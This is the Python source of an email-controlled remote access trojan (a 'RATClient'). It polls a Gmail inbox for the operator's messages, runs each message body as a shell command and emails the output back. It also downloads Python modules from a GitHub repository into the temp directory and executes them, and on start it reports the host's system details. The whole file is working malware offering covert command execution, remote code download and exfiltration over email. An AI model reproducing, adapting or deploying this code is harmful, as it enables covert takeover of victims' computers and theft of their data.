import importlib
import os
import subprocess
import time
import imaplib
import smtplib
import email
import threading
import requests
import tempfile
import platform
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.header import decode_header

# Externals
from externals.templates import create_html_content, shell

# Imports for modules
import mss #Screenshot
import datetime #For Screenshot
import io #For Screenshot
from mss.tools import to_png #For Screenshot

import socket #For Systeminfo
import uuid #For Systeminfo
import cpuinfo #For Systeminfo
import psutil #For Systeminfo

# import requests# For File Upload
import os.path# For File Upload
# import os# For File Upload


class EmailHandler:
    def __init__(self, username, password, your_mail):
        self.username = username
        self.password = password
        self.your_mail = your_mail
        self.imap_server = "imap.gmail.com"
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587

    def clean_text(self, text):
        return "".join(c if c.isalnum() else "_" for c in text)

    def login_imap(self):
        try:
            self.imap = imaplib.IMAP4_SSL(self.imap_server)
            self.imap.login(self.username, self.password)
        except Exception as e:
            print(e)
            self.login_imap()

    def fetch_emails(self, folder="INBOX", num_emails=1):
        self.imap.select(folder)
        status, messages = self.imap.search(None, f"(FROM '{self.your_mail}')")
        email_ids = messages[0].split()[-num_emails:]
        emails = []
        for email_id in email_ids:
            res, msg = self.imap.fetch(email_id, "(RFC822)")
            for response in msg:
                if isinstance(response, tuple):
                    emails.append(email.message_from_bytes(response[1]))
        return emails

    def logout_imap(self):
        self.imap.logout()

    def send_email(self, message, msgId="Somethingdifferent", reply=False):
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = self.your_mail
        if reply:
            msg['In-Reply-To'] = msgId
            msg['References'] = msgId
        msg.attach(MIMEText(message, 'html'))
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.username, self.password)
                server.send_message(msg)
        except Exception as e:
            print(f"Failed to send email: {e}")

    def send_file(self, file, filename, msgId=False, message="File Below"):
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = self.your_mail
        if msgId:
            msg['In-Reply-To'] = msgId
            msg['References'] = msgId
        msg.attach(MIMEText(message, 'plain'))
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(file)
        email.encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={filename}')
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.username, self.password)
                msg.attach(part)
                server.send_message(msg)
        except Exception as e:
            print(f"Failed to send email: {e}")

class CommandHandler:
    def __init__(self, email_handler):
        self.email_handler = email_handler
        self.msgId = ""
        self.github_repo_url = "https://github.com/siddhant385/pyhackthon"  # Replace with your GitHub repo URL
        self.temp_dir = tempfile.gettempdir()  # Use the system's temporary directory

    def execute_command(self, command):
        try:
            output = subprocess.getoutput(command)
            msg = shell(output)
            self.email_handler.send_email(message=msg, msgId=self.msgId, reply=True)
        except Exception as e:
            print(f"Command execution failed: {e}")

    def process_email_commands(self, emails):
        for msg in emails:
            from_email, encoding = decode_header(msg.get("From"))[0]
            msgId, encoding = decode_header(msg.get("Message-Id"))[0]
            if self.msgId == msgId:
                return None
            self.msgId = msgId
            if isinstance(from_email, bytes):
                from_email = from_email.decode(encoding or "utf-8")
            print("!New Message Received")
            body = self.get_email_body(msg)
            if '\r' in body:
                body = body.replace("\r","")
            print(f"Body: {[body]}")
            self.handle_command(body)
            return True

    def get_email_body(self, msg):
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == "text/plain":
                    return part.get_payload(decode=True).decode().replace('\n', ' ')
        return msg.get_payload(decode=True).decode().replace('\n', ' ')

    def module_exists(self, mod_name):
        mod_path = os.path.join(self.temp_dir, f"{mod_name}.py")
        return os.path.exists(mod_path)

    def download_module(self, mod_name):
        mod_url = f"{self.github_repo_url}/raw/unstable/bot/mods/{mod_name}.py"
        print("Mod Url: ",mod_url)
        response = requests.get(mod_url)
        if response.status_code == 200:
            mod_path = os.path.join(self.temp_dir, f"{mod_name}.py")
            with open(mod_path, 'wb') as mod_file:
                mod_file.write(response.content)
            print(f"Module '{mod_name}' downloaded successfully.")
        else:
            raise ModuleNotFoundError(f"Module '{mod_name}' not found on GitHub.")

    def handle_command(self, command):
        if command.startswith(":"):
            #print("Command",command)
            cmd_parts = command.split(',')
            mod_name = cmd_parts[0][1:].strip()  # Remove the leading ':'
            print("Mod Name",cmd_parts)
            args = cmd_parts[1:]
            print(args)
            try:
                # Check if the module exists; if not, download it
                if not self.module_exists(mod_name):
                    self.download_module(mod_name)
                
                # Dynamically import the module
                mod_path = os.path.join(self.temp_dir, f"{mod_name}.py")
                spec = importlib.util.spec_from_file_location(mod_name, mod_path)
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)

                # Run the module in a separate thread
                mod_class = getattr(mod, mod_name)
                if args == []:
                    thread = threading.Thread(target=mod_class().run, args=(self.email_handler,self.msgId))
                else:
                    thread = threading.Thread(target=mod_class().run, args=(args),kwargs={'EmailHandler':self.email_handler,"msgId":self.msgId})
                thread.start()
            except ModuleNotFoundError as e:
                self.email_handler.send_email(f"{e}")
            except Exception as e:
                self.email_handler.send_email(f"Error executing '{mod_name}': {e}")
        else:
            self.execute_command(command)

class RATClient:
    def __init__(self, username, password, your_mail, idle_interval):
        self.email_handler = EmailHandler(username, password, your_mail)
        self.command_handler = CommandHandler(self.email_handler)
        self.idle_interval = idle_interval
        self.command_interval = 1
    
    def basic_systeminfo(self):
        info = f"""Online🟢  and Ready
Platform: {platform.platform()}
Python Version: {platform.python_version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {platform.node()}
System: {platform.system()}

"""
        return info

    def start(self):
        welcome_msg = create_html_content(self.basic_systeminfo())
        self.email_handler.send_email(welcome_msg)
        last_active = time.time()
        idle = False

        while True:
            self.email_handler.login_imap()
            emails = self.email_handler.fetch_emails()
            if self.command_handler.process_email_commands(emails) is not None:
                if idle:
                    print("Switching from idle back to normal mode...")
                last_active = time.time()
                idle = False
            else:
                print("No command received.")
            if idle:
                time.sleep(self.idle_interval)
            elif (time.time() - last_active) >= self.idle_interval:
                print(f"Switching to idle... : {time.time() - last_active}")
                idle = True
            else:
                time.sleep(self.command_interval)
            self.email_handler.logout_imap()

if __name__ == "__main__":
    USERNAME = ""
    PASSWORD = ""
    YOUR_MAIL = ""
    IDLE_INTERVAL = 60

    client = RATClient(USERNAME, PASSWORD, YOUR_MAIL, IDLE_INTERVAL)
    client.start()
